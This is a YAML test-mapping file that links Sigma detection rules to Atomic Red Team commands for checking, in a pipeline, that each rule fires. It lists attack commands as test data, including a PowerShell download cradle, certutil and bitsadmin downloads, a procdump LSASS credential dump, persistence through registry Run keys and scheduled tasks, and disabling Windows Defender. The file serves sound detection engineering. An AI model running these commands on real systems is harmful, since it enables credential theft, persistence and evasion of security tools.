# ============================================================
# Atomic Red Team Test Mapping
# ============================================================
# Maps each Sigma rule to Atomic Red Team (ART) test IDs.
# When a rule is pushed, the pipeline runs corresponding
# ART tests to verify the rule actually detects the attack.
#
# Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
# ============================================================

test_mappings:

  # --- T1033: System Owner/User Discovery (whoami) ---
  susp_cmd_whoami:
    sigma_rule: "rules/susp_cmd_whoami.yml"
    mitre_technique: "T1033"
    atomic_tests:
      - test_id: "T1033-1"
        name: "System Owner/User Discovery"
        command: "whoami"
        expected_detect: true
        platform: "windows"
    min_detection_score: 80

  # --- T1059.001: PowerShell Execution ---
  susp_powershell_execution:
    sigma_rule: "rules/susp_powershell_execution.yml"
    mitre_technique: "T1059.001"
    atomic_tests:
      - test_id: "T1059.001-1"
        name: "Mimikatz via PowerShell"
        command: "powershell.exe -encodedcommand ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="
        expected_detect: true
        platform: "windows"
      - test_id: "T1059.001-7"
        name: "PowerShell Download Cradle"
        command: "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test.ps1')"
        expected_detect: true
        platform: "windows"
      - test_id: "T1059.001-BENIGN"
        name: "Benign PowerShell (should NOT trigger)"
        command: "powershell.exe Get-Process"
        expected_detect: false
        platform: "windows"
    min_detection_score: 90

  # --- T1087: Account Discovery ---
  susp_net_user_enum:
    sigma_rule: "rules/susp_net_user_enum.yml"
    mitre_technique: "T1087.001"
    atomic_tests:
      - test_id: "T1087.001-1"
        name: "Enumerate Local Users"
        command: "net.exe user"
        expected_detect: true
        platform: "windows"
      - test_id: "T1087.001-2"
        name: "Enumerate Local Groups"
        command: "net.exe localgroup administrators"
        expected_detect: true
        platform: "windows"
      - test_id: "T1087.001-BENIGN"
        name: "Net statistics (should NOT trigger)"
        command: "net.exe statistics"
        expected_detect: false
        platform: "windows"
    min_detection_score: 80

  # --- T1547.001: Registry Run Keys Persistence ---
  susp_registry_persistence:
    sigma_rule: "rules/susp_registry_persistence.yml"
    mitre_technique: "T1547.001"
    atomic_tests:
      - test_id: "T1547.001-1"
        name: "Add Registry Run Key"
        command: 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v TestMalware /t REG_SZ /d "C:\test.exe" /f'
        cleanup: 'reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v TestMalware /f'
        expected_detect: true
        platform: "windows"
    min_detection_score: 85

  # --- T1105: Ingress Tool Transfer ---
  susp_remote_file_download:
    sigma_rule: "rules/susp_remote_file_download.yml"
    mitre_technique: "T1105"
    atomic_tests:
      - test_id: "T1105-1"
        name: "Certutil Download"
        command: "certutil.exe -urlcache -split -f http://127.0.0.1/test.txt %temp%\\test.txt"
        cleanup: "del %temp%\\test.txt"
        expected_detect: true
        platform: "windows"
      - test_id: "T1105-2"
        name: "BITSAdmin Download"
        command: "bitsadmin.exe /transfer testjob /download /priority normal http://127.0.0.1/test.txt %temp%\\test.txt"
        cleanup: "del %temp%\\test.txt"
        expected_detect: true
        platform: "windows"
    min_detection_score: 85

  # --- T1003.001: LSASS Credential Dumping ---
  susp_lsass_access:
    sigma_rule: "rules/susp_lsass_access.yml"
    mitre_technique: "T1003.001"
    atomic_tests:
      - test_id: "T1003.001-6"
        name: "Procdump LSASS dump"
        command: "procdump.exe -ma lsass.exe lsass_dump"
        expected_detect: true
        platform: "windows"
        requires_admin: true
    min_detection_score: 95

  # --- T1053.005: Scheduled Task ---
  susp_scheduled_task_creation:
    sigma_rule: "rules/susp_scheduled_task_creation.yml"
    mitre_technique: "T1053.005"
    atomic_tests:
      - test_id: "T1053.005-1"
        name: "Scheduled Task via schtasks"
        command: 'schtasks.exe /create /tn "TestTask" /tr "C:\test.exe" /sc daily /st 12:00'
        cleanup: 'schtasks.exe /delete /tn "TestTask" /f'
        expected_detect: true
        platform: "windows"
    min_detection_score: 80

  # --- T1562.001: Disable Defender ---
  susp_defender_disabled:
    sigma_rule: "rules/susp_defender_disabled.yml"
    mitre_technique: "T1562.001"
    atomic_tests:
      - test_id: "T1562.001-1"
        name: "Disable Defender via PowerShell"
        command: "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
        expected_detect: true
        platform: "windows"
        requires_admin: true
      - test_id: "T1562.001-2"
        name: "Stop Defender service"
        command: "sc.exe stop WinDefend"
        expected_detect: true
        platform: "windows"
        requires_admin: true
    min_detection_score: 90

# ============================================================
# Global test configuration
# ============================================================
test_config:
  # Timeout for each test execution (seconds)
  test_timeout: 30
  # Wait time after test for log ingestion (seconds)
  log_wait_time: 10
  # Maximum parallel tests
  max_parallel: 3
  # Auto-cleanup after tests
  auto_cleanup: true
  # Safe mode — simulates commands without executing
  safe_mode: true
